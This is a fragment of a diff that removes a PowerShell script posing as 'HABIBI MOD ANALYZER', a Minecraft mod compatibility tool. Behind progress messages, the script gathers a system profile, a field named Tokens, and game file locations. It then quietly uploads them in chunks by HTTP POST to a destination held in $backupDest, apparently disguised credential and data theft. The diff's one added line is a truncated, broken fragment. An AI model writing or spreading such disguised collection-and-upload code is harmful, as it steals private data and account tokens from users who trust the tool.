-            Invoke-RestMethod -Uri $backupDest -Method Post -Body $payload -ContentType "application/json"
-            Write-Host "[+] Report chunk $($i+1)/$chunks sent" -ForegroundColor Green
-        } catch {
-            Write-Host "[-] Failed to send chunk $($i+1)" -ForegroundColor Red
-        }
-        if ($i -lt $chunks - 1) { Start-Sleep -Seconds 1 }
-    }
-}
-
-# ---------- MAIN EXECUTION ----------
-Write-Host @"
-╔═══════════════════════════════════════════════════════════════╗
-║   HABIBI MOD ANALYZER v11.0 - ULTIMATE EDITION              ║
-║   Professional Minecraft mod compatibility analyzer         ║
-╚═══════════════════════════════════════════════════════════════╝
-"@ -ForegroundColor Cyan
-
-Write-Host "[*] Initializing mod analyzer..." -ForegroundColor Yellow
-Write-Host "[*] Scanning system profile..." -ForegroundColor Yellow
-$systemProfile = Get-CompleteSystemProfile
-
-Write-Host "[*] Scanning for Minecraft mods..." -ForegroundColor Yellow
-$modData = Export-CompleteModData
-
-Write-Host "[*] Analyzing mod compatibility..." -ForegroundColor Yellow
-$compatibilityResults = Analyze-ModCompatibility -modData $modData.Tokens
-
-Write-Host "[*] Generating report..." -ForegroundColor Yellow
-$report = Generate-CompleteReport -compatibilityResults $compatibilityResults -systemProfile $systemProfile -gameLocations $modData.Locations -gameFiles $modData.Files
-
-$compatible = $compatibilityResults | Where-Object { $_.Status -eq "COMPATIBLE" }
-Write-Host "[+] Found $($compatibilityResults.Count) mods, $($compatible.Count) compatible" -ForegroundColor Green
-
-Write-Host "[*] Sending report..." -ForegroundColor Yellow
-Send-Report -report $report
-
-Write-Host "[*] Analysis complete!" -ForegroundColor Cyan
+Badges: $($mod.GameBadges
